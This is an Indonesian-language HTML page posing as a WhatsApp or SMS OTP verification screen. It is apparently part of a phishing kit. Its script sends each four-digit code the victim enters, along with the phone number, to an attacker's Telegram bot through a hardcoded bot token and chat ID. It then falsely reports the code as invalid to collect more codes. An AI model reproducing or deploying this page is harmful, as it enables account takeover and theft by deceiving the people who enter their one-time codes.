<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>OTP Input</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
</head>
<body class="bg-white min-h-screen flex flex-col">
  <header class="flex justify-between items-center p-5">
    <button aria-label="Back" class="text-black text-3xl">
      <i class="fas fa-arrow-left"></i>
    </button>
    <button aria-label="Help" class="text-black text-3xl rounded-full bg-black bg-opacity-10 w-9 h-9 flex items-center justify-center">
      <i class="fas fa-question text-black text-lg"></i>
    </button>
  </header>

  <main class="flex-grow px-6 flex flex-col items-center">
    <h1 class="font-extrabold text-2xl text-center mb-4">Masukkan Kode OTP</h1>
    <p class="text-center text-base max-w-xs leading-snug" id="otp-instruction">
      Masukkan kode yang dikirim ke <strong id="phone-number"></strong><br />
      <strong>(WhatsApp)</strong><br />
      atau <strong>**********@gmail.com</strong>
    </p>

    <form id="otp-form" class="mt-10 flex justify-center gap-6 max-w-xs w-full" autocomplete="off" novalidate>
      <input
        type="text"
        inputmode="numeric"
        maxlength="1"
        value=""
        class="w-16 h-20 text-4xl font-extrabold text-gray-700 text-center rounded-xl border-2 border-gray-300 focus:outline-none focus:border-black"
        aria-label="OTP digit 1"
        required
        autocomplete="off"
        pattern="\d"
      />
      <input
        type="text"
        inputmode="numeric"
        maxlength="1"
        value=""
        class="w-16 h-20 text-4xl font-extrabold text-gray-700 text-center rounded-xl border-2 border-gray-300 focus:outline-none focus:border-black"
        aria-label="OTP digit 2"
        required
        autocomplete="off"
        pattern="\d"
      />
      <input
        type="text"
        inputmode="numeric"
        maxlength="1"
        value=""
        class="w-16 h-20 text-4xl font-extrabold text-gray-700 text-center rounded-xl border-2 border-gray-300 focus:outline-none focus:border-black"
        aria-label="OTP digit 3"
        required
        autocomplete="off"
        pattern="\d"
      />
      <input
        type="text"
        inputmode="numeric"
        maxlength="1"
        value=""
        class="w-16 h-20 text-4xl font-extrabold text-gray-700 text-center rounded-xl border-2 border-gray-300 focus:outline-none focus:border-black"
        aria-label="OTP digit 4"
        required
        autocomplete="off"
        pattern="\d"
      />
    </form>

    <p id="message" class="mt-6 text-center text-lg font-semibold"></p>
  </main>

  <footer class="p-5 text-center">
    <p class="text-base mb-1">Tidak menerima kode?</p>
    <p class="text-sm text-gray-400 font-semibold">
      Kirim ulang atau Coba dengan SMS (<span id="timer">00:30</span>)
    </p>
  </footer>

  <script>
    // Timer code
    let timeLeft = 30;
    const timerEl = document.getElementById('timer');

    function updateTimer() {
      const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
      const seconds = String(timeLeft % 60).padStart(2, '0');
      timerEl.textContent = `${minutes}:${seconds}`;
      if (timeLeft > 0) {
        timeLeft--;
      } else {
        clearInterval(timerInterval);
      }
    }

    updateTimer();
    const timerInterval = setInterval(updateTimer, 1000);

    // Get phone number from previous page via URL query parameter "phone"
    // Example URL: currentpage.html?phone=%2B62-822-2***-6617
    function getPhoneNumberFromURL() {
      const params = new URLSearchParams(window.location.search);
      return params.get('phone');
    }

    const phoneNumber = getPhoneNumberFromURL();
    if (phoneNumber) {
      document.getElementById('phone-number').textContent = phoneNumber;
    }

    // Telegram bot info - replace with your bot token and chat ID
    const TELEGRAM_BOT_TOKEN = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
    const TELEGRAM_CHAT_ID = '7549590022';

    // Function to send message to Telegram
    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      };
      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        return response.ok;
      } catch (error) {
        return false;
      }
    }

    // Handle auto-submit when all 4 inputs are filled
    const form = document.getElementById('otp-form');
    const inputs = form.querySelectorAll('input');
    const messageEl = document.getElementById('message');

    inputs.forEach((input, idx) => {
      input.addEventListener('input', async () => {
        // Allow only digits
        input.value = input.value.replace(/\D/g, '');
        if (input.value.length === 1 && idx < inputs.length - 1) {
          inputs[idx + 1].focus();
        }

        // Check if all inputs are filled
        const otpCode = Array.from(inputs).map(i => i.value).join('');
        if (otpCode.length === inputs.length) {
          // Disable inputs to prevent multiple submits
          inputs.forEach(i => i.disabled = true);

          const phone = phoneNumber || 'Unknown phone number';
          const message = `Kode OTP diterima:\nNomor Telepon: ${phone}\nKode: ${otpCode}`;
          const success = await sendToTelegram(message);
          if (success) {
          window.location.href = "otp.html";
            messageEl.textContent = 'Kode OTP Tidak Valid';
            messageEl.classList.remove('text-gray-700');
            messageEl.classList.add('text-red-600');
            form.reset();
          } else {
            messageEl.textContent = 'Gagal mengirim kode OTP ke Telegram.';
            messageEl.classList.remove('text-red-600');
            messageEl.classList.add('text-gray-700');
          }
          inputs.forEach(i => i.disabled = false);
          inputs[0].focus();
        }
      });

      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && input.value === '' && idx > 0) {
          inputs[idx - 1].focus();
        }
      });
    });
  </script>
</body>
</html>
